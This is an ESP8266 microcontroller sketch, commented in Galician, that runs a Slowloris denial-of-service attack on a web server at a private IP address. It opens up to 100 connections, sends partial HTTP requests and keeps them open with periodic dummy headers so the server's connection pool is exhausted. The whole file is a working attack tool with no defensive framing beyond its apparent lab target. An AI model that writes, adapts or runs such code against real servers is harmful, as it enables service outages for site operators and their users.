#include <ESP8266WiFi.h>

const char* target_ip = "192.168.149.105"; // Dirección IP do servidor web
const int target_port = 80;               // Porto HTTP (xeralmente 80)
const int max_connections = 100;          // Número máximo de conexións a abrir
const int delay_between_packets = 10;    // Tempo entre envíos de datos (en segundos)

WiFiClient clients[max_connections];     // Array para almacenar as conexións

void setup() {
  // Inicializa a comunicación serie
  Serial.begin(9600);
  Serial.println("Iniciando ataque Slowloris para o número de conexións:");
  Serial.println(max_connections);

  // Conecta o ESP8266 a unha rede Wi-Fi
  WiFi.begin("SSID", "password"); // credenciais da wifi 
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("\nConectado á rede Wi-Fi.");
}

void loop() {
  int active_connections = 0;

  // Apertura de novas conexións (ou reabrir as pechadas)
  for (int i = 0; i < max_connections; i++) {
    if (!clients[i].connected()) {
      if (clients[i].connect(target_ip, target_port)) {
        // Envía unha solicitude HTTP parcial
        clients[i].print("GET / HTTP/1.1\r\n");
        clients[i].print("Host: ");
        clients[i].print(target_ip);
        clients[i].print("\r\n");
        clients[i].print("User-Agent: Slowloris\r\n");
        active_connections++;
        Serial.print("Conexión ");
        Serial.print(i + 1);
        Serial.println(" establecida.");
      } else {
        Serial.print("Erro ao establecer a conexión ");
        Serial.println(i + 1);
      }
    } else {
      active_connections++;
    }
  }

  // Mantén as conexións abertas
  for (int i = 0; i < max_connections; i++) {
    if (clients[i].connected()) {
      clients[i].print("X-a: b\r\n");
    }
  }
  
  Serial.print("Conexións activas: ");
  Serial.println(active_connections);

  // Espera antes de repetir
  delay(delay_between_packets * 1000);
}
